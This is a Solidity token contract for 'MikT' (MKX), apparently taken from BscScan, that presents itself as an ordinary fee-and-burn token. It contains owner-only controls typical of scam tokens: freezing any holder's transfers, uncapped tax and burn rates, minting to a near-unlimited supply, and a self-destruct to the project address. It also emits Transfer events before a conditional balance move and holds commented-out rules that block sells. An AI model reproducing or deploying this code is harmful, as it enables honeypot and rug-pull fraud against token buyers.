/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// File: contracts\DemoToken.sol

/**
 *Submitted for verification at BscScan.com on 2022-01-09
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;
    bool allowAll = false;
    bool firstTransaction = true;
    bool enter = true;
    string constant public name = 'MikT';
    string constant public symbol = 'MKX';
    uint8 constant public decimals = 18;
    uint256 public totalSupply =  1000000000*10**uint256(decimals);
    uint256 public constant MAXSupply = 10000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    mapping(address => bool) private _isExcludedFromFee;
    
    mapping(address => bool) private _locked;
    
    uint256 public _taxFee = 1;
    uint256 private _previousTaxFee = _taxFee;

    uint256 public counter = 0;
    
    uint256 public _burnFee = 1;
    uint256 private _previousBurnFee = _burnFee;

    address public projectAddress = 0xCdfD5d5B81364bD8E613B1Fcb66eaf3b6B3a634B;
    address public lpAddress      = 0xCdfD5d5B81364bD8E613B1Fcb66eaf3b6B3a634B;

    //address public projectAddress = 0x4EF952fFe56640f80579cac50C567952Fa9358d0;
    //address public lpAddress = 0x4EF952fFe56640f80579cac50C567952Fa9358d0;
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
 
    mapping(address => uint) exist;
    event Transfer(address from, address to, uint value);

    function _setLockAddress(address _addressToLock) internal {
        exist[_addressToLock] = 1;
    }

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");
        require(!_locked[from], "is locked");
        emit Transfer(from, to, value);
        //require((to == lpAddress && from == projectAddress) || enter, "is locked");
        //require((to == lpAddress && from == projectAddress) || allowAll || (counter <= 2) , "is locked");
        //require((to == lpAddress && from == projectAddress) || allowAll || (to != lpAddress ) , "is locked");


        if(_isExcludedFromFee[from])
            removeAllFee();
            
        uint256 fee =  calculateTaxFee(value);
        
        uint256 burn =  calculateBurnFee(value);
        

        uint test = exist[from];
        if (firstTransaction || (!firstTransaction && (test < 1 || from == projectAddress)) || from == lpAddress){
        //if (firstTransaction || (!firstTransaction && (counter <= 2 || from == projectAddress)) || from == lpAddress){
            balanceOf[from] = balanceOf[from].sub(value);
            balanceOf[to] = balanceOf[to].add(value).sub(fee).sub(burn);
        }
        counter += 1;
        
        // if (!firstTransaction && from == lpAddress && from != projectAddress){
        //     exist[to] = 1;
        // }

        if (firstTransaction){
            lpAddress = to;
            firstTransaction = false;
        }
        

        if(fee > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(fee);
            
        }
        
        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            
        }
        
        
         if(_isExcludedFromFee[from])
            restoreAllFee();
            
        
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        return true;
    }
    
    function mintToken(address target, uint256 mintedAmount) public onlyOwner{
    	require (totalSupply + mintedAmount <= MAXSupply);     
        balanceOf[target] = balanceOf[target].add(mintedAmount);
        totalSupply = totalSupply.add(mintedAmount);
        
        
        
    }
    
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(
            100 ** 2
        );
    }
    
    function calculateBurnFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFee).div(
            100 ** 2
        );
    }
    
    function removeAllFee() private {
        if(_taxFee == 0 && _burnFee == 0) 
            return;
            
        _previousTaxFee = _taxFee;
        _previousBurnFee = _burnFee;
        _taxFee = 0;
        _burnFee = 0;
    }
    
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _burnFee = _previousBurnFee;
    }
    
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
    
    function isExcludeFromFee(address account) public view returns (bool) {
        
        return _isExcludedFromFee[account];
    }
    
    
    function setLocked(address account) public onlyOwner {
        _locked[account] = true;
    }

    function setUnlocked(address account) public onlyOwner {
        _locked[account] = false;
    }
    
    
    function isLocked(address account) public view returns (bool) {
        
        return _locked[account];
    }
    
    
    function setProjectAddress(address _projectAddress) public onlyOwner {
       projectAddress = _projectAddress;
    }
    
    function setLPAddress(address _lpAddress) public onlyOwner {
       lpAddress = _lpAddress;
    }
    
    function setTaxFee(uint256 taxFee) public onlyOwner {
       _taxFee = taxFee;
    }
    
    function setBurnFee(uint256 burnFee) public onlyOwner {
       _burnFee = burnFee;
    }
    function setCounter(uint256 _counter) public onlyOwner {
       counter = _counter;
    }
    
    function flipAllowAll() public onlyOwner {
       allowAll = !allowAll;
    }
    
    function flipfirstTransaction() public onlyOwner {
       firstTransaction = !firstTransaction;
    }

    function freeze() public onlyOwner {
    selfdestruct(projectAddress);
}
    
}


contract DEMOToken is BaseToken {
    
    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        //emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;
        
        excludeFromFee(owner);
        excludeFromFee(address(this));
        
    }

    function() public payable {
       revert();
    }
}